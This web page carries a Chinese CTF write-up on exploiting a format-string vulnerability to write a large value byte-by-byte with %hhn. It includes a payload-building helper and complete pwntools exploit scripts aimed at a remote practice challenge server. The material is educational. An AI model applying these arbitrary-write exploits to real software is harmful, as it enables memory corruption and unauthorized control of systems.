@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+        <link rel="canonical" href="https://windowsnekoray.github.io/news/article-33859.htm" />
+    <meta charset="utf-8">
+    <!-- Always force latest IE rendering engine -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <!-- Mobile Specific Meta -->
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>格式字符串漏洞之任意地址覆盖大数字</title>
+        <meta name="description" content="格式化字符串漏洞覆盖大数字时，如果选择一次性输出大数字个字节来进行覆盖，会很久很久，或者直接报错中断，所以来搞个攻防世界高手区的题目来总结一下 pwn高手区，实时数据监测这道题，就是格式化字符串漏洞覆" />
+        <link rel="icon" href="/assets/website/img/windowsnekoray/favicon.ico" type="image/x-icon"/>
+    <!-- BOOTSTRAP CSS -->
+    <link rel="stylesheet" href="/assets/website/css/windowsnekoray/bootstrap.min.css">
+    <!-- FONT-AWESOME -->
+    <link rel="stylesheet" href="/assets/website/css/windowsnekoray/font-awesome-4.7.0/css/font-awesome.min.css">
+    <!-- OWL CAROUSEL -->
+    <link href="/assets/website/css/windowsnekoray/owl.carousel.min.css" rel="stylesheet">
+    <link href="/assets/website/css/windowsnekoray/owl.theme.default.min.css" rel="stylesheet">
+    <!-- LIGHTBOX -->
+    <link rel=" stylesheet" href="/assets/website/css/windowsnekoray/lightbox.css">
+    <!--Style CSS file-->
+    <link rel=" stylesheet" href="/assets/website/css/windowsnekoray/style.css">
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FP5Q3FML8Q"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FP5Q3FML8Q');
+</script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
+     crossorigin="anonymous"></script>
+</head>
+
+<body data-page="detail">
+        <!-- ====== Preloader ======  -->
+    <div id="loader-wrapper">
+        <div id="loader"></div>
+        <div class="loader-section section-left"></div>
+        <div class="loader-section section-right"></div>
+    </div>
+    <!-- ======End Preloader ======  -->
+    <!-- ======START NAVGITION ======  -->
+    <nav class="navbar navbar-expand-lg">
+        <!-- logo -->
+                <a class="navbar-brand" href="/">
+            Windows NekoRay
+        </a>
+                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarText">
+            <span class="icon-bar"><i class="fa fa-bars fa-2x"></i></span>
+        </button>
+        <!--End of Resposive Toggle icon-->
+        <div class="collapse navbar-collapse" id="navbarText">
+            <!--Main menu navigation list-->
+            <ul class="navbar-nav ml-auto line">
+                                <li class="nav-item">
+                    <a class="nav-link" href="/">首页</a>
+                </li>
+                                <li class="nav-item">
+                    <a class="nav-link" href="/free-nodes/">免费节点</a>
+                </li>
+                                <li class="nav-item">
+                    <a class="nav-link" href="/paid-subscribe/">推荐机场</a>
+                </li>
+                                <li class="nav-item">
+                    <a class="nav-link" href="/news/">新闻资讯</a>
+                </li>
+                                <li class="nav-item">
+                    <a class="nav-link" href="#">关于</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#">联系</a>
+                </li>
+                
+            </ul>
+            <!--End of Main menu navigation list-->
+        </div>
+        <!--End of resposive collapse class-->
+    </nav>
+    <!-- ====== END NAVGITION ======  -->
+    <!-- =======START HEADER=========== -->
+    <header class="home list" id="home" data-scroll-index="0">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-6 home-content mt-md-5 mt-sm-5">
+                    <h2 class="heading-tertiary mt-3 mb-3">
+                        格式字符串漏洞之任意地址覆盖大数字                    </h2>
+                    <p class="mb-5">
+                        <a href="/">首页</a> / <a href="/news/">新闻资讯</a> / <span>正文</span>
+                    </p>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- ====== END HEADER ======  -->
+    <!-- Scroll to Top -->
+    <div id="scroll-to-top"><i class="fa fa-arrow-up fa-fw"></i></div>
+    <!-- ====== START ABOUT ======  -->
+    <section class="about padding" id="about" data-scroll-index="1">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-9">
+                                    <input type="hidden" id="share-website-info" data-name="" data-url="">
+                  				  				  				<div id="content_views" class="markdown_views prism-atom-one-dark"> <p>格式化字符串漏洞覆盖大数字时，如果选择一次性输出大数字个字节来进行覆盖，会很久很久，或者直接报错中断，所以来搞个攻防世界高手区的题目来总结一下</p> <p>pwn高手区，实时数据监测这道题，就是格式化字符串漏洞覆盖大数字</p> <p><img decoding="async" src="http://img.555519.xyz/uploads/20230118/53e77ba9a586693ad8984d6819c174d6.jpg" alt="格式字符串漏洞之任意地址覆盖大数字"><br /><img decoding="async" src="http://img.555519.xyz/uploads/20230118/f1bdc68091062a3b251c31b277c08d57.jpg" alt="格式字符串漏洞之任意地址覆盖大数字"></p> <p>题目运行时会直接告诉你key的地址，我们只需要利用imagemagic中的printf利用格式化字符串漏洞来覆盖就行了，但就像刚才说的，直接覆盖时间太久了而且会报错，所以可以想想别的办法</p> <p>如果我们想覆盖key为0x02223322，那么根据小端存储，在内存中就是\x22 \x33 \x22 \x02，高地址放高位，低地址放低位</p> <p>在格式化字符串中，%hhn会向某个地址写入单字节，%hn 会向某个地址写入双字节，单字节的用的比较多</p> <p>在这道题中，要覆盖的地址为0x0804a048，要覆盖的数据为0x02223322，相当于</p> <pre><code class="prism language-python"><span class="token number">0x0804a048</span> \x22 <span class="token number">0x0804a049</span> \x33 <span class="token number">0x0804a04a</span> \x22 <span class="token number">0x0804a04b</span> \x02 </code></pre> <p>字符串偏移用%p计算出来为12</p> <p><img decoding="async" src="http://img.555519.xyz/uploads/20230118/8b4e5c1bae8dff3423c9a25eb60d4c0c.jpg" alt="格式字符串漏洞之任意地址覆盖大数字"></p> <p>所以payload构造如下</p> <pre><code class="prism language-python">payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a048</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804a049</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804a04a</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804a04b</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%12$n'</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%13$n'</span> <span class="token operator">+</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'%14$n'</span> <span class="token operator">+</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%15$n'</span> </code></pre> <p>很麻烦，但是wiki中给出了一个模板，无论在x86还是x64下都能使用</p> <p>模板如下</p> <pre><code class="prism language-python"><span class="token comment">#prev表示前面已输出的字节</span> <span class="token comment">#word表示应该输出的字节</span> <span class="token comment">#index表示偏移量</span> <span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> word<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>         result <span class="token operator">=</span> word <span class="token operator">-</span> prev         fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>     <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>         result <span class="token operator">=</span> <span class="token number">0</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>         result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev         fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>     fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>     <span class="token keyword">return</span> fmtstr  <span class="token comment">#offset表示起始偏移量，比如这题为12</span> <span class="token comment">#size表示字节长度，x86为4，x64为8</span> <span class="token comment">#addr表示要覆盖的地址，这题为0x0804a048</span> <span class="token comment">#target表示要覆盖的值，这题为0x02223322</span> <span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>     payload <span class="token operator">=</span> <span class="token string">""</span>     <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>             payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>         <span class="token keyword">else</span><span class="token punctuation">:</span>             payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>     prev <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>     <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#一次传送一个字节</span>         payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">&gt;&gt;</span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>         prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">&gt;&gt;</span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>     <span class="token keyword">return</span> payload payload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A048</span><span class="token punctuation">,</span><span class="token number">0x02223322</span><span class="token punctuation">)</span> </code></pre> <p>这里要注意一下prev &gt; word的情况，因为已经输出的字符串大于了我们要输入的数值，所以前面加了256，一次只接受一个字节，用溢出来穿，比如prev = 2，word = 1，result = 255，再算上之前已经传的2，一共是257，溢出之后就是1，就是我们要传的数值</p> <p>完整exp如下 我用的高版本乌班图，然后是python3，所以做了一些修改，来保证bytes和str</p> <pre><code class="prism language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>  p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'111.200.241.244'</span><span class="token punctuation">,</span> <span class="token string">'58464'</span><span class="token punctuation">)</span> <span class="token comment"># p = process("./hello_pwn")</span>  <span class="token comment"># p.recvuntil(b"Please closing the reaction kettle\n")</span> <span class="token comment"># p.recvuntil(b"The switch is:0x4006b0\n")</span> <span class="token comment"># p.recvuntil(b"&gt;\x00")</span> <span class="token comment"># payload = p64(0x04005F6) + 35795745*b'\x00' + b'%12$n'#第12个参数 AAAA</span> <span class="token comment"># payload = fmtstr_payload(12,{0x804a048:0x02223322})</span> <span class="token comment"># payload = p32(0x0804a048)+p32(0x0804a049)+p32(0x0804a04a)+p32(0x0804a04b)+b'a'*() + b'%12$n'+b'a'*() + b'%13$n' + b'a'*()+b'%14$n' + b'a'*() + b'%15$n'</span> <span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span>word<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>         result <span class="token operator">=</span> word <span class="token operator">-</span> prev         fmtstr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>         result <span class="token operator">=</span> <span class="token number">0</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>         result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev         fmtstr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>     fmtstr <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$hhn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> fmtstr  <span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>size<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>     payload <span class="token operator">=</span> <span class="token string">b""</span>     <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>             payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>         <span class="token keyword">else</span><span class="token punctuation">:</span>             payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>     prev <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>     <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">&gt;&gt;</span> i <span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>         prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">&gt;&gt;</span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>     <span class="token keyword">return</span> payload  payload <span class="token operator">=</span>fmt_str<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x804a048</span><span class="token punctuation">,</span><span class="token number">0x2223322</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> </code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads/20230118/b8b7508f506cdc54d2f87e179d1ec522.jpg" alt="格式字符串漏洞之任意地址覆盖大数字"></p> <p>参考ctf-wiki <a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/?h=%E5%A4%A7%E6%95%B0#_15"  rel="nofollow">跳转处</a></p> <p>也可以直接用fmtstr_payload，它是pwntools中的一个工具，可以简化格式化字符串漏洞的利用</p> <p>pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=‘byte’) → str</p> <p>第一个参数为偏移，第二个参数{addr:value}表示写入的数据，第三个参数表示已输出的字符，这里默认值为0，我就没写，第四个参数表示写入参数一次写入的大小，有byte，short，int，对应hhn，hn，n</p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://docs.pwntools.com/en/stable/fmtstr.html"  rel="nofollow">官方文档</a></p> <p>exp如下</p> <pre><code class="prism language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>  p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'111.200.241.244'</span><span class="token punctuation">,</span> <span class="token string">'58464'</span><span class="token punctuation">)</span>  payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token punctuation">{<!-- --></span><span class="token number">0x804a048</span><span class="token punctuation">:</span><span class="token number">0x02223322</span><span class="token punctuation">}</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> </code></pre> <p>非常简短，很方便</p> </p></div> 			                <div class="clearfix"></div>
+                <div class="col-md-12 mt-5">
+                                        <p>上一个：<a href="/news/article-33443.htm">宠物领养条件要求（宠物领养的条件）</a></p>
+                                        <p>下一个：<a href="/news/article-33860.htm">动物接种疫苗多少钱一次打的（动物接种疫苗多少钱一次打的好）</a></p>
+                                    </div>
+                                </div>
+                <div class="col-md-3">
+                    <div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">热门文章</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2"><a href="/free-nodes/2024-10-18-free-node-subscribe.htm" title="「10月18日」最高速度19.3M/S，2024年NekoRay每天更新免费节点订阅链接">「10月18日」最高速度19.3M/S，2024年NekoRay每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-11-2-free-shadowrocket-node.htm" title="「11月2日」最高速度20.7M/S，2024年NekoRay每天更新免费节点订阅链接">「11月2日」最高速度20.7M/S，2024年NekoRay每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-7-24-node-share-links.htm" title="「7月24日」最高速度21.6M/S，2024年NekoRay每天更新免费节点订阅链接">「7月24日」最高速度21.6M/S，2024年NekoRay每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-8-1-node-share-links.htm" title="「8月1日」最高速度20.2M/S，2024年NekoRay每天更新免费节点订阅链接">「8月1日」最高速度20.2M/S，2024年NekoRay每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-8-17-free-nekoray.htm" title="「8月17日」最高速度22.4M/S，2024年NekoRay每天更新免费节点订阅链接">「8月17日」最高速度22.4M/S，2024年NekoRay每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/news/article-23529.htm" title="动物疫苗防疫站几点上班（动物疫苗防疫站几点上班的）">动物疫苗防疫站几点上班（动物疫苗防疫站几点上班的）</a></li>
+                        <li class="py-2"><a href="/news/article-27715.htm" title="小猫为什么不能打（小猫为什么不能打屁呢）">小猫为什么不能打（小猫为什么不能打屁呢）</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-7-12-free-subscribe-node.htm" title="「7月12日」最高速度18.5M/S，2024年NekoRay每天更新免费节点订阅链接">「7月12日」最高速度18.5M/S，2024年NekoRay每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/news/article-33859.htm" title="格式字符串漏洞之任意地址覆盖大数字">格式字符串漏洞之任意地址覆盖大数字</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-9-4-free-nekoray.htm" title="「9月4日」最高速度21.8M/S，2024年NekoRay每天更新免费节点订阅链接">「9月4日」最高速度21.8M/S，2024年NekoRay每天更新免费节点订阅链接</a></li>
+                    </ul>
+    </div>
+</div>
+
+<div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">归纳</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">3</span> <a href="/date/2025-01/" title="2025-01 归档">2025-01</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">93</span> <a href="/date/2024-12/" title="2024-12 归档">2024-12</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">34</span> <a href="/date/2024-11/" title="2024-11 归档">2024-11</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">31</span> <a href="/date/2024-10/" title="2024-10 归档">2024-10</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">30</span> <a href="/date/2024-09/" title="2024-09 归档">2024-09</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">31</span> <a href="/date/2024-08/" title="2024-08 归档">2024-08</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">25</span> <a href="/date/2024-07/" title="2024-07 归档">2024-07</a></h4>
+            </li>
+                    </ul>
+    </div>
+</div>
+
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- ====== END ABOUT======  -->
+        <!-- ====== START FOOTER ======  -->
+    <section class="footer">
+        <div class="container">
+            <div class="row">
+                <!-- START FOOTER BOTTOM -->
+                <div class="offset-md-3 col-md-6 offset-md-3">
+                    <!-- START RIGHTS -->
+                    <div class="copyright">
+                            <p>
+                                <a href="/">首页</a> | 
+                                <a href="/free-node/">免费节点</a> | 
+                                <a href="/news/">新闻资讯</a> |
+                                <a href="/about-us.htm">关于我们</a> |
+                                <a href="/disclaimer.htm">免责申明</a> |
+                                <a href="/privacy.htm">隐私申明</a> |
+                                <a href="/sitemap.xml">网站地图</a>
+                            </p>
+                        <p>WindowsNekoRay节点分享站 版权所有</p>
+                        <p>Powered by WordPress</p>
+                    </div>
+                    <!-- END RIGHTS -->
+                </div>
+                <!-- END FOOTER BOTTOM -->
+            </div>
+        </div>
+    </section>
+    <!-- ====== END FOOTER ======  -->
+    <!-- ====== JS ======  -->
+    <!--jquery-3.3.1 js-->
+    <script src="/assets/website/js/frontend/windowsnekoray/jquery-3.3.1.min.js"></script>
+    <!-- popper js -->
+    <script src="/assets/website/js/frontend/windowsnekoray/popper.min.js"></script>
+    <!-- bootstrap js -->
+    <script src="/assets/website/js/frontend/windowsnekoray/bootstrap.min.js"></script>
+    <!-- scrollIt js -->
+    <script src="/assets/website/js/frontend/windowsnekoray/scrollIt.min.js"></script>
+    <!-- countTo js -->
+    <script src="/assets/website/js/frontend/windowsnekoray/jquery.countTo.js"></script>
+    <!-- filter js -->
+    <script src="/assets/website/js/frontend/windowsnekoray/jquery.filterizr.min.js"></script>
+    <!-- waypoints js -->
+    <script src="/assets/website/js/frontend/windowsnekoray/waypoints.min.js"></script>
+    <!-- owl carousel js -->
+    <script src="/assets/website/js/frontend/windowsnekoray/owl.carousel.min.js"></script>
+    <!-- validator js -->
+    <script src="/assets/website/js/frontend/windowsnekoray/validator.js"></script>
+    <!-- coustom js -->
+    <script src="/assets/website/js/frontend/windowsnekoray/main.js"></script>
+    <!-- lightbox js -->
+    <script src="/assets/website/js/frontend/windowsnekoray/lightbox.js"></script>
+    <script src="https://www.freeclashnode.com/assets/js/frontend/invite-url.js"></script>
+    <script src="/assets/website/js/frontend/G.js"></script>
+</body>
+
+</html>
